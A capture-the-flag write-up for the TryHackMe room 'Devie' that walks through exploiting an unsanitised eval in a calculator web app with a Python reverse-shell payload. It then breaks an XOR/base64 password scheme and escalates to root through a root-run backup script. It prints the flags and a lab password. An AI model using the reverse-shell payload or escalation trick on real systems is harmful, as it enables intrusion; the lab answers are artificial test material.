# Devie

A writeup for the room [Devie](https://tryhackme.com/room/devie) on TryHackMe.

> A developer has asked you to do a vulnerability check on their system.

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/d7a57cca442e6309f73c9245f40ee950.png" width="256" />

### Scanning

It is possible to start by scanning the machine for open ports with nmap.

There are only the 22 port for SSH and 5000.

<Image src={require("./nmap.png").default} />

By connecting to the port 5000 with the browser we can find a web application.
The website allows to do different math calculations.

<Image src={require("./website.png").default} />

In the footer of the page is possible to download the source code.

### First flag

By looking careful to the code we can see a vulnerability in the eval function with user input. There is no sanitation, it only checks that the values given are string.

<Image src={require("./vuln.png").default} />

We can try to obtain a reverse shell by using a custom payload.

For example:

```py
__import__('os').system('bash -c \'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\'')#
```

Substitute the IP and the port.
On your machine run:

```sh
nc -nvlp <PORT>
```

Once inside the machine, the first flag is in the home folder of the user: `THM{Car3ful_witH_3v@l}`.

<Image src={require("./flag1.png").default} />

### Second flag

In the home folder of the user (Bruce) we can find a note with this content:

```
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

The encryption process is `encode_base64(cleartext ^ key) = ciphertext`

We can encrypt a simple message like a very long list of duplicated 'a'.
In this way it is possible to calculate the key.

`decode_base64(ciphertext) = ciphertext = cleartex ^ key -> cleartex ^ key ^ cleartext = key`

<Image src={require("./key.png").default} />

It is possible to write a simple Python script to decrypt easily the password.

```py
import base64

cleartext = "00000000000000000000000000"
ciphertext = "Q0VAVUJDVVNCVURbVUlIX0JIX0JDRUBVQkM="

decoded = base64.b64decode(ciphertext)

# Find the key value
key = ""
for i, c in enumerate(decoded):
    # Remember c ^ cleartext = cleartex ^ key ^ cleartext = key`
    key += chr(c ^ ord(cleartext[i]))

ciphertext = b"NEUEDTIeN1MRDg5K"
decoded = base64.b64decode(ciphertext)

# Find the password value
password = ""
for i, c in enumerate(decoded):
    # Remember c ^ key = cleartext
    password += chr(c ^ ord(key[i]))

print(password)
```

By executing this script we can find the password `G0th@mR0ckz!`.
The second flag is inside the home folder of the user Gordon: `THM{X0R_XoR_XOr_xOr}`.

<Image src={require("./flag2.png").default} />

### Third flag

There is a custom script called `backup` in `/usr/bin` that we can execute.
It copies everything inside the reports folder of gordon to the backups folder.
This action is made as root, so we can add a symlink to the root folder and make it copy also that.

```sh
#!/bin/bash
cd /home/gordon/reports/
cp * /home/gordon/backups/
```

```
bash -p
```
